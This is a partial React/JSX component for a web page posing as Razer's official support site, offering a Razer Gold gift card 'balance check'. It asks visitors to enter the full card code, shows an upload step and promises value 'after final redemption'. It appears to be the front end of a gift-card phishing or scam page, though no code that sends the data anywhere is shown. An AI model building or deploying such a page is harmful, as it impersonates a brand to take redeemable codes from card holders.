    ...
    <div className={styles.razerPage}>
      ...
      <main className={styles.main}>
        <div className={styles.breadcrumb}>
          Support › Razer Gold › Check Balance
        </div>

        <section className={styles.cardSection}>
          <div className={styles.formContainer}>
            <h1 className={styles.mainTitle}>Razer Gold Gift Card</h1>
            <p className={styles.subtitle}>Check your balance instantly by entering your Razer Gold code below.</p>
            ...
            <div className={styles.card}>
              ...
              {result && !showUploadStep && (
                <div className={styles.result}>
                  ...
                  {uploadComplete && (
                    <div style={{ background: 'rgba(68, 214, 44, 0.15)', color: '#44d62c', padding: '12px', marginBottom: '15px', textAlign: 'center' }}>
                      ✓ Uploaded successfully
                    </div>
                  )}
                  <p className={styles.readyMsg}>Value will be added to your Razer Gold account after final redemption.</p>
            ...
            <div className={styles.tutorialWrapper}>
              ...
              <div className={`${styles.tutorialContent} ${showTutorial ? styles.show : ''}`}>
                ...
                <div className={styles.tutorialStep}>
                  ...
                  <div className={styles.stepText}>Enter the full code above to check your balance instantly.</div>
                </div>
              </div>
            </div>
          </div>
